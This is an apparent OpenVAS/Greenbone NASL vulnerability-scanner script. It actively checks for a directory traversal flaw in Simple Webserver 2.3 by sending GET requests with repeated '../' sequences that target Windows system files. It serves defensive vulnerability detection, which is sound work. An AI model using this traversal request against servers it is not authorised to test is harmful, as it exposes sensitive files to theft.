# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103632");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-01-04 10:25:13 +0100 (Fri, 04 Jan 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Simple Webserver <= 2.3 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PMSoftware-SWS/banner", "Host/runs_windows");

  script_tag(name:"summary", value:"Simple Webserver is prone to a directory traversal
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Remote attackers can use specially crafted requests with
  directory traversal sequences ('../') to retrieve arbitrary files in the context of the
  application.");

  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119239/Simple-Webserver-2.3-rc1-Directory-Traversal.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || "Server: PMSoftware-SWS" >!< banner)
  exit(0);

files = traversal_files("windows");

foreach pattern (keys(files)) {
  req = string("GET ", crap(data: "../", length: 9 * 6), files[pattern], " HTTP/1.1\r\n\r\n");
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

  if (eregmatch(pattern: pattern, string: res)) {
    report = "It was possible to obtain the file '" + files[pattern] + "'." + '\n\nResult:\n\n' + chomp(res);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
